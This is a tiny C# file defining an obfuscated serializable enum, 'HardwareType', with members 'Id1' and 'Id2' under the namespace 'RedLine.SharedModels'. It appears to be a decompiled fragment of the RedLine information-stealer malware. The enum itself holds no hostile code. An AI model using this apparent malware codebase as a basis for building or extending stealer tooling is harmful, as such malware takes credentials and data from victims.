using System.Runtime.Serialization;

namespace RedLine.SharedModels;

[DataContract(Name = "Entity14", Namespace = "Entity")]
public enum HardwareType : uint
{
	[EnumMember]
	Id1,
	[EnumMember]
	Id2
}
